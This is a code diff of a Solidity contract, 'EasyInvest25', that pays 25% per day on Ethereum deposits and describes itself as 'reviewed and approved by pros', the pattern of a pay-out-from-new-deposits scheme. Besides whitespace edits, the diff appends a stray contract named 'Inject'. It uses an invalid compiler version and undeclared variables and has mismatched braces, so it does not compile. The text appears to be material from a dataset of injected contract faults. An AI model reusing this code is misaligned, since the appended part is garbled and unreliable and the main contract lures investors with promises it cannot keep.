@@ -18,7 +18,7 @@ pragma solidity ^0.4.24;
  * Contract reviewed and approved by pros!
  *
  */
- 
+
 contract EasyInvest25 {
     address owner;
 
@@ -33,7 +33,7 @@ contract EasyInvest25 {
     function() external payable {
          // if sender (aka YOU) is invested more than 0 ether
         if (invested[msg.sender] != 0){
-         // calculate profit amount as such:   
+         // calculate profit amount as such:
         address kashout = msg.sender;
         // amount = (amount invested) * 25% * (blocks since last transaction) / 5900
         // 5900 is an average block count per day produced by Ethereum blockchain
@@ -45,4 +45,15 @@ contract EasyInvest25 {
         atBlock[msg.sender] = block.number;
         invested[msg.sender] += msg.value;
     }
+}
+pragma solidity ^0.5.24;
+contract Inject {
+	uint depositAmount;
+	constructor() public {owner = msg.sender;}
+	function freeze(address account,uint key) {
+		if (msg.sender != minter)
+			revert();
+			freezeAccount[account] = key;
+		}
+	}
 }
